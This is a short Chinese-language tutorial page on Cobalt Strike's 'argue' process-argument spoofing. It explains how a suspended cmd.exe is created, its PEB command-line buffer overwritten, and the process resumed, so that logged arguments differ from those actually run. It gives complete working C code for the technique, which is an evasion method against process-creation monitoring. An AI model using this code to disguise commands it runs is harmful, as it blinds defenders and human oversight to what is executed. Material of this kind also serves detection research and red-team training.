# CobaltStrike Argue伪装命令

## 简介

在Cobalt Strike 3.13版本的时候引入了一个进程参数欺骗的技术\(虽然现在都4.0了\)，可以使进程在创建时记录的参数与实际运行时不同，在原理上几乎与命令行伪装一样，只是有一些流程上的不同，这里不过多赘述详见[伪装命令行规避检测](fake-commandline.md)。

## 利用流程

1. 创建一个挂起的cmd或powershell进程。
2. 读取peb内的RTL\_USER\_PROCESS\_PARAMETERS结构体。
3. 定位到commandline的buffer指针。
4. 修改buffer的存放的commandline。

## 代码实现

```text
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>


typedef DWORD(*pNtQueryInformationProcess) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main()
{

	ULONG lenght = 0;
	HMODULE hModule;
	PROCESS_BASIC_INFORMATION ProcessInformation;
	pNtQueryInformationProcess NtQueryInformationProcess;
	wchar_t CommandLine[] = L"C:\\Windows\\system32\\cmd.exe /c dir";
	//.&& whoami / priv && pause"
	wchar_t CurrentDirectory[] = L"C:\\Windows\\system32\\";

	hModule = LoadLibraryA("ntdll.dll");

	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA(NULL, (LPSTR)"C:\\Windows\\system32\\cmd.exe /c whoami", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);
	
	RTL_USER_PROCESS_PARAMETERS rupp = { 0 };
	PEB peb = { 0 };

	ReadProcessMemory(pi.hProcess, ProcessInformation.PebBaseAddress, &peb, sizeof(peb), NULL);
	ReadProcessMemory(
		pi.hProcess,
		peb.ProcessParameters,
		&rupp,
		sizeof(RTL_USER_PROCESS_PARAMETERS)
		, NULL);

	WriteProcessMemory(pi.hProcess, (LPVOID)rupp.CommandLine.Buffer, CommandLine, sizeof(CommandLine), NULL);
	ResumeThread(pi.hThread);

	return 0;
}
```

